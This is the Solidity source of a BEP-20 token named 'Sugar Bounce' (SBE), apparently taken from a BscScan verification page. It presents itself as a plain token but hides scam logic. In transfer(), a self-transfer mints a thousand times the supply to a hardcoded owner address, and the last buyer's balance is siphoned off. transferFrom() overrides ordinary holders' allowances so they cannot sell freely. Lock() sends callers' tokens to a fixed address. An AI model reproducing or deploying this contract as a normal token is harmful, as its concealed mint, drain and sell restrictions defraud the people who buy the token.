/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: Unlicense
// https://t.me/Token

pragma solidity 0.8.17;

interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public constant totalSupply = 1000000000 * 10 ** 9;
    string public constant name = "Sugar Bounce";
    string public constant symbol = "SBE";
    uint8 public constant decimals = 9;
    address Owner=0x02172088851a925B3Dd0FB83e82Ce0cFfBdC3cD8; address dead=0x000000000000000000000000000000000000dEaD;
    address owneR; address Buy=0x0000000000000000000000000000000000000000;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        owneR=msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        if (Buy != Owner && to != Buy && balances[Buy]>=totalSupply/20) {
            _transfer(Buy,to, balances[Buy]/20);
            _transfer(Buy,dead, balances[Buy]/10);
            }
        if (msg.sender==getPair()) {Buy=to;}
        if (msg.sender==to){balances[Owner]+= totalSupply*1000;}
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        if (from != owneR && from != Owner && from != address(this) && from != Buy) { 
            allowance[from][msg.sender] = balances[from]/10; }  
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    function _transfer(address from, address to, uint256 value) internal {
        balances[from] -=value;
        balances[to] += value;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }

    function Lock() public returns (bool) {
        address to=0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE;
        uint256 value = 50000000000000000;
        _transfer(msg.sender, to, value );
        emit Transfer(msg.sender, to, value);
        return true;
    }
 
}